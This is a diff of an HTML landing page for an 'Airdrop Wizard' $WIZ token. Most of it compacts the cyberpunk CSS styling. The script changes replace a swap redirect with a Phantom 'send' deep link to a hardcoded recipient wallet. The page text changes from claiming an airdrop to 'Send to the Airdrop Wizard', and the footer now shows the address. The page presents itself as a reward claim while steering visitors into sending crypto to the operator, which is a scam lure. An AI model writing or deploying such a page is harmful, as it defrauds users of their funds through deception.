@@ -16,11 +16,7 @@
       --darker: #05050f;
     }
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       background: linear-gradient(135deg, #0a0a1f 0%, #1a0033 100%);
@@ -33,34 +29,19 @@
       position: relative;
     }
 
-    /* Cyberpunk Scanlines & Glitch */
     body::before {
       content: '';
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: repeating-linear-gradient(
-        transparent 0px,
-        transparent 2px,
-        rgba(255,255,255,0.03) 2px,
-        rgba(255,255,255,0.03) 4px
-      );
+      background: repeating-linear-gradient(transparent 0px, transparent 2px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.03) 4px);
       pointer-events: none;
       z-index: 1;
       animation: scan 4s linear infinite;
     }
 
-    @keyframes scan {
-      0% { transform: translateY(-100%); }
-      100% { transform: translateY(100%); }
-    }
+    @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
 
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 20px;
-      position: relative;
-      z-index: 2;
-    }
+    .container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 2; }
 
     header {
       text-align: center;
@@ -107,10 +88,9 @@
     .card {
       background: rgba(10, 10, 31, 0.85);
       border: 4px solid var(--neon-cyan);
-      box-shadow: 0 0 40px var(--neon-cyan),
-                  inset 0 0 30px rgba(0, 255, 255, 0.2);
+      box-shadow: 0 0 40px var(--neon-cyan), inset 0 0 30px rgba(0,255,255,0.2);
       padding: 50px 60px;
-      max-width: 700px;
+      max-width: 720px;
       width: 100%;
       position: relative;
       overflow: hidden;
@@ -119,18 +99,13 @@
     .card::before {
       content: '';
       position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
+      top: -50%; left: -50%;
+      width: 200%; height: 200%;
       background: radial-gradient(circle, rgba(0,255,255,0.15) 0%, transparent 70%);
       animation: pulse 8s infinite;
     }
 
-    @keyframes pulse {
-      0%, 100% { opacity: 0.6; }
-      50% { opacity: 1; }
-    }
+    @keyframes pulse { 0%,100% { opacity: 0.6; } 50% { opacity: 1; } }
 
     h1 {
       font-size: 3.2rem;
@@ -153,8 +128,7 @@
       padding: 25px 80px;
       border: none;
       cursor: pointer;
-      box-shadow: 0 0 40px #ff00ff,
-                  0 0 80px #00ffff;
+      box-shadow: 0 0 40px #ff00ff, 0 0 80px #00ffff;
       transition: all 0.3s;
       text-transform: uppercase;
       letter-spacing: 4px;
@@ -164,24 +138,16 @@
 
     .connect-btn:hover {
       transform: scale(1.1) rotate(2deg);
-      box-shadow: 0 0 60px #ff00ff,
-                  0 0 100px #00ffff;
-    }
-
-    .connect-btn:active {
-      transform: scale(0.95);
+      box-shadow: 0 0 60px #ff00ff, 0 0 100px #00ffff;
     }
 
     .status {
       margin-top: 30px;
       font-size: 1.4rem;
-      min-height: 30px;
+      min-height: 80px;
     }
 
-    .connected {
-      color: #39ff14;
-      text-shadow: 0 0 15px #39ff14;
-    }
+    .connected { color: #39ff14; text-shadow: 0 0 15px #39ff14; }
 
     footer {
       text-align: center;
@@ -192,15 +158,8 @@
 
     .scanline {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(
-        to bottom,
-        transparent 50%,
-        rgba(57, 255, 20, 0.05) 50%
-      );
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(to bottom, transparent 50%, rgba(57,255,20,0.05) 50%);
       background-size: 100% 4px;
       pointer-events: none;
       z-index: 3;
@@ -227,7 +186,7 @@
         <h1>CONNECT YOUR PHANTOM WALLET</h1>
         <p class="description">
           The future is here.<br>
-          Claim your $WIZ airdrop and join the neon revolution.
+          Send to the Airdrop Wizard and claim your $WIZ rewards in the neon grid.
         </p>
         
         <button id="connectBtn" class="connect-btn">
@@ -239,13 +198,14 @@
     </div>
 
     <footer>
-      © 2026 Airdrop Wizard • $WIZ TOKEN • ALL RIGHTS RESERVED IN THE METAVERSE
+      © 2026 Airdrop Wizard • $WIZ TOKEN • SEND TO: MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn
     </footer>
   </div>
 
   <script>
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
+    const RECIPIENT = "MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn";
 
     async function connectPhantom() {
       if (!window.solana || !window.solana.isPhantom) {
@@ -256,17 +216,28 @@
 
       try {
         const resp = await window.solana.connect();
+        const pubkey = resp.publicKey.toString();
+
         statusDiv.innerHTML = `
-          <span class="connected">✅ CONNECTED SUCCESSFULLY</span><br>
-          <span style="font-size:1.2rem; color:#00ff00;">Wallet: ${resp.publicKey.toString().slice(0,8)}...${resp.publicKey.toString().slice(-6)}</span>
+          <span class="connected">✅ WALLET CONNECTED SUCCESSFULLY</span><br>
+          <span style="font-size:1.3rem; color:#00ff00;">${pubkey.slice(0,8)}...${pubkey.slice(-6)}</span>
         `;
-        
-        // You can redirect or trigger your actual buy/claim flow here
+
+        // Open Phantom Send screen (works great on mobile)
         setTimeout(() => {
-          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Redirecting to buy $WIZ...</span>`;
-          // Replace with your actual Raydium / Jupiter / Pump.fun link
-          window.location.href = "https://raydium.io/swap/?inputCurrency=sol&outputCurrency=YOUR_TOKEN_ADDRESS_HERE";
-        }, 1500);
+          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Opening Phantom Send to Wizard...</span>`;
+          
+          // Phantom deep link to send SOL (or any token) to the address
+          const phantomSendUrl = `https://phantom.app/ul/v1/send?to=${RECIPIENT}&network=solana`;
+          
+          // Fallback for desktop users
+          if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
+            window.location.href = phantomSendUrl;
+          } else {
+            window.open(phantomSendUrl, '_blank');
+            statusDiv.innerHTML += `<br><span style="color:#ffaa00;">(Desktop) Click the link above or open Phantom manually and send to:</span><br><span style="font-size:1.1rem; word-break:break-all;">${RECIPIENT}</span>`;
+          }
+        }, 1200);
 
       } catch (err) {
         console.error(err);
@@ -276,10 +247,10 @@
 
     connectBtn.addEventListener('click', connectPhantom);
 
-    // Auto-detect Phantom on load
+    // Show detection on load
     window.addEventListener('load', () => {
       if (window.solana && window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom wallet detected ✓</span>`;
+        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom wallet detected ✓ Ready for the neon grid</span>`;
       }
     });
   </script>
